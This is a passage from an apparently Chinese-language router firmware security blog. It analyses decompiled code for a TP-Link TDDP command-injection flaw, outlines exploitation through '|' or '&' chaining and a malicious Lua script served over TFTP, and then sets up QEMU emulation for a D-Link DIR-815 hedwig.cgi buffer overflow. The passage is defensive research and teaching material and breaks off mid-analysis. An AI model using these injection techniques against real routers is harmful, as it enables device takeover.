a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v1; <span class="comment">// r0</span></span><br><span class="line">  __int16 v2; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r3</span></span><br><span class="line">  __int64 v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">64</span>]; <span class="comment">// [sp+8h] [bp-E4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">64</span>]; <span class="comment">// [sp+48h] [bp-A4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [sp+88h] [bp-64h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [sp+C8h] [bp-24h]</span></span><br><span class="line">  _BYTE *v13; <span class="comment">// [sp+CCh] [bp-20h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [sp+D0h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [sp+D4h] [bp-18h]</span></span><br><span class="line">  <span class="type">char</span> *v16; <span class="comment">// [sp+D8h] [bp-14h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [sp+DCh] [bp-10h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [sp+E0h] [bp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *v19; <span class="comment">// [sp+E4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v18 = <span class="number">1</span>;</span><br><span class="line">  v17 = <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">  v1 = <span class="built_in">memset</span>(name, <span class="number">0</span>, <span class="keyword">sizeof</span>(name));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v15 = luaL_newstate(v1);</span><br><span class="line">  v19 = (<span class="type">char</span> *)(a1 + <span class="number">45083</span>);</span><br><span class="line">  v14 = a1 + <span class="number">82</span>;</span><br><span class="line">  v13 = (_BYTE *)(a1 + <span class="number">45083</span>);</span><br><span class="line">  v12 = a1 + <span class="number">82</span>;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">83</span>) = <span class="number">49</span>;</span><br><span class="line">  *(_DWORD *)(v12 + <span class="number">4</span>) = htonl(<span class="number">0</span>);</span><br><span class="line">  *(_BYTE *)(v12 + <span class="number">2</span>) = <span class="number">2</span>;</span><br><span class="line">  v2 = ((<span class="type">unsigned</span> __int8)v13[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v13[<span class="number">8</span>];</span><br><span class="line">  v3 = v12;</span><br><span class="line">  *(_BYTE *)(v12 + <span class="number">8</span>) = v13[<span class="number">8</span>];</span><br><span class="line">  *(_BYTE *)(v3 + <span class="number">9</span>) = HIBYTE(v2);</span><br><span class="line">  <span class="keyword">if</span> ( *v13 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v19 += <span class="number">12</span>;</span><br><span class="line">    v14 += <span class="number">12</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v19 += <span class="number">28</span>;</span><br><span class="line">    v14 += <span class="number">28</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v19 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  <span class="built_in">sscanf</span>(v19, <span class="string">&quot;%[^;];%s&quot;</span>, s, v10);</span><br><span class="line">  <span class="keyword">if</span> ( !s[<span class="number">0</span>] || !v10[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] luaFile or configFile len error.\n&quot;</span>, <span class="string">&quot;tddp_cmd_configSet&quot;</span>, <span class="number">555</span>);</span><br><span class="line">LABEL_20:</span><br><span class="line">    *(_BYTE *)(v12 + <span class="number">3</span>) = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> error(<span class="number">-10303</span>, <span class="string">&quot;config set failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = inet_ntoa(*(<span class="keyword">struct</span> in_addr *)(a1 + <span class="number">4</span>));</span><br><span class="line">  sub_91DC(<span class="string">&quot;cd /tmp;tftp -gr %s %s &amp;&quot;</span>, s, v16);</span><br><span class="line">  <span class="built_in">sprintf</span>(name, <span class="string">&quot;/tmp/%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">while</span> ( v17 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !access(name, <span class="number">0</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    --v17;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v17 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] lua file [%s] don&#x27;t exsit.\n&quot;</span>, <span class="string">&quot;tddp_cmd_configSet&quot;</span>, <span class="number">574</span>, name);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v15 )</span><br><span class="line">  &#123;</span><br><span class="line">    luaL_openlibs(v15);</span><br><span class="line">    v4 = luaL_loadfile(v15, name);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      v4 = lua_pcall(v15, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    lua_getfield(v15, <span class="number">-10002</span>, <span class="string">&quot;config_test&quot;</span>, v4);</span><br><span class="line">    lua_pushstring(v15, v10);</span><br><span class="line">    lua_pushstring(v15, v16);</span><br><span class="line">    lua_call(v15, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    v5 = lua_tonumber(v15, <span class="number">-1</span>);</span><br><span class="line">    v18 = sub_16EC4(v5, HIDWORD(v5));</span><br><span class="line">    lua_settop(v15, <span class="number">-2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  lua_close(v15);</span><br><span class="line">  <span class="keyword">if</span> ( v18 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  *(_BYTE *)(v12 + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当<code>TDDP</code>协议是<code>Version 1</code>的时候，<code>v18</code>会从<code>TDDP</code>包的首地址往后移<code>12</code>个字节，也就是<strong>从“报头”移动到“数据”的首地址</strong>接着就到了一个<code>sscanf</code>函数：</p><p>这个<code>sscanf</code>函数将传进来的<code>TDDP</code>包数据区按照分离符<code>;</code>分为<code>s</code>和<code>v9</code>两个字符串，其中利用正则表达式过滤了<code>s</code>中的<code>;</code>，之后，字符串<code>s</code>拼接到了<code>cd /tmp;tftp -gr</code>的后面，这显然是一个<code>shell</code>命令，而<code>s</code>拼接上去很可能就导致了任意命令的执行，我们来看<code>sub_91DC</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_91DC</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv; <span class="comment">// [sp+8h] [bp-11Ch] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// [sp+Ch] [bp-118h]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [sp+10h] [bp-114h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+14h] [bp-110h]</span></span><br><span class="line">  <span class="type">int</span> stat_loc; <span class="comment">// [sp+18h] [bp-10Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// [sp+1Ch] [bp-108h] BYREF</span></span><br><span class="line">  <span class="type">__pid_t</span> pid; <span class="comment">// [sp+11Ch] [bp-8h]</span></span><br><span class="line">  va_list varg_r1; <span class="comment">// [sp+12Ch] [bp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  va_start(varg_r1, a1);</span><br><span class="line">  pid = <span class="number">0</span>;</span><br><span class="line">  stat_loc = <span class="number">0</span>;</span><br><span class="line">  argv = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">vsprintf</span>(s, a1, varg_r1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] cmd: %s \r\n&quot;</span>, <span class="string">&quot;tddp_execCmd&quot;</span>, <span class="number">72</span>, s);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> ( pid &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !pid )</span><br><span class="line">  &#123;</span><br><span class="line">    argv = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line">    v4 = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">    v5 = s;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, &amp;argv, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">127</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( waitpid(pid, &amp;stat_loc, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *_errno_location() != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，这里的确就是一个<code>shell</code>命令的执行，有两种利用方式：</p><p>1.字符串<code>s</code>在<code>sscanf</code>分离的时候仅过滤了<code>;</code>，而 <strong><code>|</code>和<code>&amp;</code> 也可以作为连接符，对两句独立命令进行连接</strong>。</p><p>2.<code>tftp -gr ...</code>命令是利用<code>FTP</code>协议，从<code>...</code>路径下载文件，在这里是保存到<code>/tmp</code>目录下,而后面的<code>v4 = luaL_loadfile(v15, name);</code>函数对<code>Lua</code>脚本进行加载运行。</p><p>因此，我们若是想<strong>传一个路径到字符串<code>s</code>中</strong>也是可以的，不过<strong>需要先搭建<code>TFTP Server</code>，然后在某目录下放一个可执行恶意命令的<code>Lua</code>脚本文件</strong>。</p><h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><p>启动脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line">    -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">    -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">    -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span> \</span><br><span class="line">    -net nic -net tap,ifname=tap0 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><h1 id="DIR-815缓冲区溢出"><a href="#DIR-815缓冲区溢出" class="headerlink" title="DIR-815缓冲区溢出"></a>DIR-815缓冲区溢出</h1><p>漏洞报告<a href="https://www.exploit-db.com/exploits/33863">D-Link Devices - ‘hedwig.cgi’ Remote Buffer Overflow in Cookie Header (Metasploit) - Hardware remote Exploit (exploit-db.com)</a></p><p>固件包下载<a href="https://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/">legacyfiles.us.dlink.com - /DIR-815/REVA/FIRMWARE/</a></p><h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>通过随便查看提取出来的文件包里的二进制文件</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-28_221409.png" alt=""></p><p>确认这是32位小端序mipsl</p><p>到<a href="https://people.debian.org/~aurel32/qemu/">Index of /~aurel32/qemu (debian.org)</a>拉取文件系统与kernel镜像</p><p>因为是小端序的所以选择<code>debian_squeeze_mipsel_standard.qcow2</code>与<code>vmlinux-3.2.0-4-4kc-malta</code></p><p>首先依然是网络配置,还是老几样</p><ol><li>创建一个虚拟网桥,并分配地址</li><li>创建一个tap设备,并分配地址并将其添加到虚拟网桥中作为接口</li><li>启动脚本中指定tap设备,并在虚拟机中为网络设备分配地址</li></ol><p>启动脚本如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">-M malta \</span><br><span class="line">-kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">-hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> \</span><br><span class="line">-net nic \</span><br><span class="line">-net tap,ifname=tap0 \</span><br><span class="line">-nographic \</span><br></pre></td></tr></table></figure><p>然后这题看别的博客还提到需要打开物理机转换功能,不是很清楚但以防万一也跟着做一下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure><p>此外,这题环境需要用到http配置服务</p><p>现在提取出来的文件系统中存放一个配置文件http_conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  </span><br><span class="line">ErrorLog /log </span><br><span class="line"> </span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class="line">    ServerId &quot;1234&quot;</span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0 #对应qemu仿真路由器系统的网卡</span><br><span class="line">    Address 192.168.234.3 #qemu仿真路由器系统的IP</span><br><span class="line">    Port &quot;1234&quot; #对应未被使用的端口</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /          #服务器目录</span><br><span class="line">            Location /htdocs/web        #源</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>且由于环境的问题,我们之后将服务的运行切换到模拟的qemu根目录</p><p>使用脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">cp</span> http_conf /</span><br><span class="line"><span class="built_in">cp</span> sbin/httpd /</span><br><span class="line"><span class="built_in">cp</span> -rf htdocs/ /</span><br><span class="line"><span class="built_in">mkdir</span> /etc_bak</span><br><span class="line"><span class="built_in">cp</span> -r /etc /etc_bak</span><br><span class="line"><span class="built_in">rm</span> /etc/services</span><br><span class="line"><span class="built_in">cp</span> -rf etc/ /</span><br><span class="line"><span class="built_in">cp</span> lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libc.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libgcc_s.so.1  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/ld-uClibc.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libcrypt.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libgcc_s.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">rm</span> -rf /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/sbin/phpcgi</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/sbin/hnap</span><br><span class="line"><span class="built_in">ln</span> -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">ln</span> -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line"><span class="built_in">ln</span> -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure><p>因为修改了<code>etc</code>文件,所以退出之前记得还原</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">rm</span> -rf /etc</span><br><span class="line"><span class="built_in">mv</span> /etc_bak/etc /etc</span><br><span class="line"><span class="built_in">rm</span> -rf /etc_bak</span><br></pre></td></tr></table></figure><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据报告可以知道漏洞出在hedwig.cgi中,但可以发现这其实是指向cgibin的软连接</p><p>ida打开文件后看到main仅仅是匹配参数并跳转</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;hedwig.cgi&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = (<span class="type">void</span> (__noreturn *)())hedwigcgi_main;</span><br><span class="line">  v9 = argc;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="type">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>gedwigcgi_main</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  v0 = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">&quot;no REQUEST&quot;</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">LABEL_34:</span><br><span class="line">    v9 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(v0, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">&quot;unsupported HTTP request&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  cgibin_parse_request(sub_409A6C, <span class="number">0</span>, <span class="number">0x20000</span>);</span><br><span class="line">  v2 = fopen(<span class="string">&quot;/etc/config/image_sign&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(v26, <span class="number">128</span>, v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">&quot;unable to read signature!&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>首先获取环境变量REQUEST_METHOD,并且可以判断必须是post方法</p><p>然后进入cgibin_parse_request,该函数用于进一步处理http请求</p><p>在其中又会要求三个环境变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( getenv(<span class="string">&quot;CONTENT_TYPE&quot;</span>) &amp;&amp; (v6 = getenv(<span class="string">&quot;CONTENT_LENGTH&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">  v7 = atoi(v6);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">v21 = sobj_new();</span><br><span class="line">v8 = sobj_new();</span><br><span class="line">v22 = v8;</span><br><span class="line">v9 = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( v21 &amp;&amp; v8 )</span><br><span class="line">&#123;</span><br><span class="line">  v10 = getenv(<span class="string">&quot;REQUEST_URI&quot;</span>);</span><br></pre></td></tr></table></figure><p>虽然对漏洞利用没什么影响,但依然需要传递这些</p><p><code>sobj</code>是<code>stringobject</code>的缩写,这一系列的函数都是针对字符串的</p><p>一种可能的实现如下<a href="https://github.com/coolshou/DIR-850L_A1/blob/master/comlib/strobj.c">DIR-850L_A1/comlib/strobj.c at master · coolshou/DIR-850L_A1 (github.com)</a></p><p>之后不必多做关注,继续走到一个关键函数sess_get_uid</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 